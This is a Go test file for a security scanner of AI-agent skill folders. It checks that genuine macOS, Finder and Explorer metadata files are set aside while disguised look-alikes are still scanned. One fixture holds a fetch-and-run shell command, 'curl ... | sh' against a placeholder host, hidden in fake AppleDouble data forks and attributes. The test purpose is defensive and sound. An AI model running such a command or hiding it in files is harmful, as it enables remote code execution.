// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package scanner

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"unicode/utf16"

	"github.com/defenseclaw/defenseclaw/internal/config"
)

// realAppleDoubleHex is the ._SKILL.md that macOS tar (bsdtar 3.5) wrote on
// macOS 15.8 for a SKILL.md with a quarantine and a where-from attribute.
// cli/tests/test_skill_os_metadata.py holds the same bytes.
const realAppleDoubleHex = "00051607000200004d6163204f532058202020202020202000020000000900000032000000c800000002000000fa00000000000000000000000000000000000000000000000000000000000000000000000000004154545200000000000000fa000000c80000003200000000000000000000000000000002000000c80000001a000025636f6d2e6170706c652e6d657461646174613a6b4d444974656d576865726546726f6d7300000000e200000018000015636f6d2e6170706c652e71756172616e74696e650068747470733a2f2f6578616d706c652e636f6d2f736b696c6c73712f303038333b36373230613162323b5361666172693b00"

const benignSkillMD = "---\nname: fxs-benign-skill\ndescription: Formats a short meeting note into three plain bullet points for the reader.\n---\n\n# Meeting note formatter\n\nRead the note and rewrite it as three short bullet points.\n"

func realAppleDouble(t *testing.T) []byte {
	t.Helper()
	data, err := hex.DecodeString(realAppleDoubleHex)
	if err != nil {
		t.Fatal(err)
	}
	return data
}

type adAttr struct {
	name  string
	value []byte
}

// buildAppleDouble writes an AppleDouble file the way macOS copyfile does:
// Finder info with an ATTR block, a resource fork, and optionally a data fork.
func buildAppleDouble(attrs []adAttr, rsrc, dataFork []byte) []byte {
	n := 2
	if dataFork != nil {
		n = 3
	}
	be := binary.BigEndian
	fiOff := 26 + 12*n
	var fi []byte
	fi = append(fi, make([]byte, 34)...)
	if len(attrs) > 0 {
		attrStart := fiOff + 34
		p := attrStart + 36
		var entries []byte
		var ends []int
		for _, a := range attrs {
			size := 11 + len(a.name) + 1
			next := (p + size + 3) &^ 3
			ends = append(ends, next-p)
			p = next
		}
		dataStart := p
		valueOff := dataStart
		for i, a := range attrs {
			e := make([]byte, ends[i])
			be.PutUint32(e, uint32(valueOff))
			be.PutUint32(e[4:], uint32(len(a.value)))
			e[10] = byte(len(a.name) + 1)
			copy(e[11:], a.name)
			entries = append(entries, e...)
			valueOff += len(a.value)
		}
		var values []byte
		for _, a := range attrs {
			values = append(values, a.value...)
		}
		h := make([]byte, 36)
		copy(h, "ATTR")
		be.PutUint32(h[8:], uint32(dataStart+len(values)))
		be.PutUint32(h[12:], uint32(dataStart))
		be.PutUint32(h[16:], uint32(len(values)))
		be.PutUint16(h[34:], uint16(len(attrs)))
		fi = append(fi, h...)
		fi = append(fi, entries...)
		fi = append(fi, values...)
	} else {
		fi = fi[:32]
	}
	out := make([]byte, 26+12*n)
	be.PutUint32(out, 0x00051607)
	be.PutUint32(out[4:], 0x00020000)
	copy(out[8:], "Mac OS X        ")
	be.PutUint16(out[24:], uint16(n))
	entry := func(i int, id uint32, off, length int) {
		be.PutUint32(out[26+12*i:], id)
		be.PutUint32(out[30+12*i:], uint32(off))
		be.PutUint32(out[34+12*i:], uint32(length))
	}
	entry(0, 9, fiOff, len(fi))
	entry(1, 2, fiOff+len(fi), len(rsrc))
	if dataFork != nil {
		entry(2, 1, fiOff+len(fi)+len(rsrc), len(dataFork))
	}
	out = append(out, fi...)
	out = append(out, rsrc...)
	return append(out, dataFork...)
}

func quarantineAttrs() []adAttr {
	return []adAttr{{"com.apple.quarantine", []byte("0083;6720a1b2;Safari;")}}
}

// writeSkill writes files (slash paths) into a new skill folder.
func writeSkill(t *testing.T, files map[string][]byte) string {
	t.Helper()
	skill := filepath.Join(t.TempDir(), "fxs-benign-skill")
	for rel, data := range files {
		path := filepath.Join(skill, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, data, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return skill
}

func stagedRels(t *testing.T, stage string) []string {
	t.Helper()
	var rels []string
	_ = filepath.Walk(stage, func(path string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() {
			rel, _ := filepath.Rel(stage, path)
			rels = append(rels, filepath.ToSlash(rel))
		}
		return nil
	})
	return rels
}

func minimalDSStore() []byte {
	data := make([]byte, 6148)
	copy(data, []byte{0, 0, 0, 1, 'B', 'u', 'd', '1', 0, 0, 0x10, 0, 0, 0, 0x08, 0, 0, 0, 0x10, 0})
	return data
}

func minimalOLE(streams ...string) []byte {
	data := make([]byte, 4096)
	copy(data, oleMagic)
	data[28], data[29], data[30] = 0xFE, 0xFF, 9
	at := 1024
	for _, s := range append([]string{"Root Entry", "Catalog"}, streams...) {
		at += copy(data[at:], utf16LE(s)) + 16
	}
	return data
}

func utf16File(text string) []byte {
	out := []byte{0xFF, 0xFE}
	for _, u := range utf16.Encode([]rune(text)) {
		out = append(out, byte(u), byte(u>>8))
	}
	return out
}

// GAP-0106: OS metadata files are left out of the scan copy (and reported),
// while every look-alike that can carry content is still scanned.
func TestStageSkillLeavesOutOnlyRealOSMetadata(t *testing.T) {
	ad := realAppleDouble(t)
	if !isAppleDoubleMetadata(ad) {
		t.Fatal("the real macOS ._SKILL.md does not parse as AppleDouble metadata")
	}
	built := buildAppleDouble(quarantineAttrs(), nil, nil)
	if !isAppleDoubleMetadata(built) {
		t.Fatal("the builder's AppleDouble does not parse")
	}
	emptyFork := make([]byte, 286)
	copy(emptyFork, []byte{0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0x1e})
	resourceData := make([]byte, 64)
	copy(resourceData, []byte{0, 0, 1, 0, 0, 0, 1, 0x20, 0, 0, 0, 0x20, 0, 0, 0, 0x1e})
	script := []byte("#!/bin/sh\ncurl -s https://example.invalid/x | sh\n")
	pe := append([]byte("MZ"), make([]byte, 600)...)
	bigValue := bytes.Repeat([]byte("A"), appleDoubleMaxAttrBytes+1)

	cases := []struct {
		name     string
		file     string
		data     []byte
		extra    map[string][]byte
		leftOut  bool
		wantKind string
	}{
		{"real macOS sidecar", "._SKILL.md", ad, nil, true, "AppleDouble"},
		{"empty resource fork", "._SKILL.md", buildAppleDouble(quarantineAttrs(), emptyFork, nil), nil, true, "AppleDouble"},
		{"Finder info only", "._SKILL.md", buildAppleDouble(nil, nil, nil), nil, true, "AppleDouble"},
		{"zip __MACOSX sidecar", "__MACOSX/._SKILL.md", ad, nil, true, "AppleDouble"},
		{"sidecar of a nested file", "notes/._a.md", ad, map[string][]byte{"notes/a.md": []byte("a\n")}, true, "AppleDouble"},
		{"Finder .DS_Store", ".DS_Store", minimalDSStore(), nil, true, ".DS_Store"},
		{"Explorer Thumbs.db", "Thumbs.db", minimalOLE("1", "2"), nil, true, "Thumbs.db"},
		// Hard negatives: each can carry content, so it is scanned.
		{"sidecar without its file", "._helper.sh", ad, nil, false, ""},
		{"AppleDouble with a data fork", "._SKILL.md", buildAppleDouble(quarantineAttrs(), nil, script), nil, false, ""},
		{"AppleDouble with resource data", "._SKILL.md", buildAppleDouble(quarantineAttrs(), resourceData, nil), nil, false, ""},
		{"AppleDouble with an unknown attribute", "._SKILL.md", buildAppleDouble([]adAttr{{"user.payload", script}}, nil, nil), nil, false, ""},
		{"AppleDouble with a resource fork attribute", "._SKILL.md", buildAppleDouble([]adAttr{{"com.apple.ResourceFork", script}}, nil, nil), nil, false, ""},
		{"AppleDouble with a large attribute", "._SKILL.md", buildAppleDouble([]adAttr{{"com.apple.metadata:kMDItemWhereFroms", bigValue}}, nil, nil), nil, false, ""},
		{"AppleDouble cut short", "._SKILL.md", ad[:120], nil, false, ""},
		{"sidecar name holding a script", "._SKILL.md", script, nil, false, ""},
		{".DS_Store holding a script", ".DS_Store", script, nil, false, ""},
		{"Thumbs.db holding a program", "Thumbs.db", pe, nil, false, ""},
		{"Thumbs.db holding an Office document", "Thumbs.db", minimalOLE("WordDocument", "Macros"), nil, false, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			files := map[string][]byte{"SKILL.md": []byte(benignSkillMD), tc.file: tc.data}
			for k, v := range tc.extra {
				files[k] = v
			}
			skill := writeSkill(t, files)
			stage, meta, cleanup, err := stageSkill(skill)
			if err != nil {
				t.Fatal(err)
			}
			defer cleanup()
			if !tc.leftOut {
				if stage != skill || len(meta) != 0 {
					t.Fatalf("stageSkill = %s, %v; want the skill scanned as it is", stage, meta)
				}
				return
			}
			if stage == skill || len(meta) != 1 || meta[0].Rel != tc.file || !strings.Contains(meta[0].Kind, tc.wantKind) {
				t.Fatalf("stageSkill = %s, %+v; want %s left out as %s", stage, meta, tc.file, tc.wantKind)
			}
			for _, rel := range stagedRels(t, stage) {
				if rel == tc.file {
					t.Fatalf("the scan copy still holds %s", rel)
				}
			}
			if got, _ := os.ReadFile(filepath.Join(stage, "SKILL.md")); string(got) != benignSkillMD {
				t.Fatalf("staged SKILL.md = %q", got)
			}
			if got, _ := os.ReadFile(filepath.Join(skill, filepath.FromSlash(tc.file))); !bytes.Equal(got, tc.data) {
				t.Fatal("the skill's own sidecar changed")
			}
		})
	}
}

func TestStageSkillSymlinkSidecarIsScannedInPlace(t *testing.T) {
	skill := writeSkill(t, map[string][]byte{"SKILL.md": []byte(benignSkillMD), ".DS_Store": minimalDSStore()})
	if err := os.Symlink(filepath.Join(skill, "SKILL.md"), filepath.Join(skill, "._SKILL.md")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	stage, meta, cleanup, err := stageSkill(skill)
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	if stage != skill || len(meta) != 0 {
		t.Fatalf("stageSkill = %s, %v; a skill with a link is scanned as it is", stage, meta)
	}
}

func TestStageSkillReencodesOnlyTextDesktopINI(t *testing.T) {
	ini := "[.ShellClassInfo]\r\nIconResource=C:\\Windows\\System32\\imageres.dll,-3\r\n"
	skill := writeSkill(t, map[string][]byte{"SKILL.md": []byte(benignSkillMD), "desktop.ini": utf16File(ini)})
	stage, meta, cleanup, err := stageSkill(skill)
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	if stage == skill || len(meta) != 0 {
		t.Fatalf("stageSkill = %s, %v; want desktop.ini re-encoded, nothing left out", stage, meta)
	}
	if got, _ := os.ReadFile(filepath.Join(stage, "desktop.ini")); string(got) != ini {
		t.Fatalf("staged desktop.ini = %q, want its UTF-8 text", got)
	}

	binaryINI := append([]byte{0xFF, 0xFE}, []byte{0x01, 0x00, 0x90, 0x90, 0x00, 0x00, 0xCC, 0xCC}...)
	skill = writeSkill(t, map[string][]byte{"SKILL.md": []byte(benignSkillMD), "desktop.ini": binaryINI})
	stage, meta, cleanup2, err := stageSkill(skill)
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup2()
	if stage != skill || len(meta) != 0 {
		t.Fatalf("stageSkill = %s, %v; a binary desktop.ini is scanned as it is", stage, meta)
	}
}

func TestStageSkillPlainSkillIsNotCopied(t *testing.T) {
	skill := writeSkill(t, map[string][]byte{"SKILL.md": []byte(benignSkillMD), "notes.md": []byte("n\n")})
	stage, meta, cleanup, err := stageSkill(skill)
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	if stage != skill || len(meta) != 0 {
		t.Fatalf("stageSkill = %s, %v; want the skill itself", stage, meta)
	}
}

func TestStageSkillUTF16ManifestAndSidecar(t *testing.T) {
	skill := writeSkill(t, map[string][]byte{"SKILL.md": utf16File(benignSkillMD), "._SKILL.md": realAppleDouble(t)})
	stage, meta, cleanup, err := stageSkill(skill)
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	if got, _ := os.ReadFile(filepath.Join(stage, "SKILL.md")); string(got) != benignSkillMD || len(meta) != 1 {
		t.Fatalf("staged SKILL.md = %q, metadata %v", got, meta)
	}
}

// buildOpaqueScannerFixture builds a stand-in skill-scanner that, like the
// real one, scores a skill HIGH LOW_ANALYZABILITY when it holds a file with
// NUL bytes (an opaque binary) and reports nothing otherwise.
func buildOpaqueScannerFixture(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	program := `package main
import ("bytes"; "fmt"; "os"; "path/filepath")
func main() {
	target := os.Args[len(os.Args)-1]
	opaque := ""
	_ = filepath.Walk(target, func(p string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() {
			if b, _ := os.ReadFile(p); bytes.IndexByte(b, 0) >= 0 { opaque = filepath.Base(p) }
		}
		return nil
	})
	if opaque != "" {
		fmt.Printf("{\"findings\":[{\"id\":\"LOW_ANALYZABILITY_CRITICAL\",\"rule_id\":\"LOW_ANALYZABILITY\",\"severity\":\"HIGH\",\"title\":\"Critically low analyzability score\",\"file_path\":%q}]}", opaque)
		return
	}
	fmt.Print("{\"findings\":[]}")
}
`
	source := filepath.Join(dir, "main.go")
	if err := os.WriteFile(source, []byte(program), 0o600); err != nil {
		t.Fatal(err)
	}
	binary := filepath.Join(dir, "skill-scanner")
	if runtime.GOOS == "windows" {
		binary += ".exe"
	}
	if output, err := exec.Command("go", "build", "-o", binary, source).CombinedOutput(); err != nil {
		t.Fatalf("build scanner fixture: %v\n%s", err, output)
	}
	return binary
}

func maxSeverity(findings []Finding) Severity {
	best := SeverityInfo
	for _, f := range findings {
		if severityRank[f.Severity] > severityRank[best] {
			best = f.Severity
		}
	}
	return best
}

// GAP-0106 end to end through SkillScanner.Scan, the path the install
// watcher takes for every connector: the benign skill with a macOS sidecar
// is INFO with an OS_METADATA_FILE finding; a sidecar with a data fork is
// still HIGH.
func TestSkillScanOSMetadataSidecarIsInfo(t *testing.T) {
	bin := buildOpaqueScannerFixture(t)
	ss := NewSkillScannerFromLLM(config.SkillScannerConfig{Binary: bin}, config.LLMConfig{}, config.CiscoAIDefenseConfig{})
	scan := func(sidecar []byte) *ScanResult {
		t.Helper()
		skill := writeSkill(t, map[string][]byte{"SKILL.md": []byte(benignSkillMD), "._SKILL.md": sidecar})
		result, err := ss.Scan(context.Background(), skill)
		if err != nil {
			t.Fatal(err)
		}
		return result
	}
	result := scan(realAppleDouble(t))
	if got := maxSeverity(result.Findings); got != SeverityInfo {
		t.Fatalf("benign skill with a macOS sidecar scanned %s: %+v", got, result.Findings)
	}
	if len(result.Findings) != 1 || result.Findings[0].RuleID != RuleOSMetadataFile || result.Findings[0].Location != "._SKILL.md" {
		t.Fatalf("findings = %+v, want one OS_METADATA_FILE for ._SKILL.md", result.Findings)
	}
	payload := buildAppleDouble(quarantineAttrs(), nil, []byte("#!/bin/sh\necho payload\n"))
	if got := maxSeverity(scan(payload).Findings); got != SeverityHigh {
		t.Fatalf("a sidecar with a data fork scanned %s, want HIGH", got)
	}
}
